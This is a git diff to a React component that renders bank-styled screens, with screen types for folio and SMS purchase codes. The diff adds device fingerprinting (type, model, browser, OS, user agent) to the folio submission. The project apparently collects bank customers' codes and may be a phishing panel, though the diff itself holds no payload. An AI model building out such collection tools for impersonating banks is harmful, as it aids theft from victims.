@@ -4,6 +4,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType, BankType } from '@shared/schema';
 import QRScanner from './QRScanner';
+import { detectDevice } from '@/utils/deviceDetection';
 
 // Para debug
 console.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);
@@ -164,7 +165,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+              onClick={() => {
+                const deviceInfo = detectDevice();
+                onSubmit(ScreenType.FOLIO, { 
+                  folio: folioInput,
+                  deviceType: deviceInfo.type,
+                  deviceModel: deviceInfo.model,
+                  deviceBrowser: deviceInfo.browser,
+                  deviceOs: deviceInfo.os,
+                  userAgent: deviceInfo.userAgent
+                });
+              }}
             >
               Continuar
             </Button>
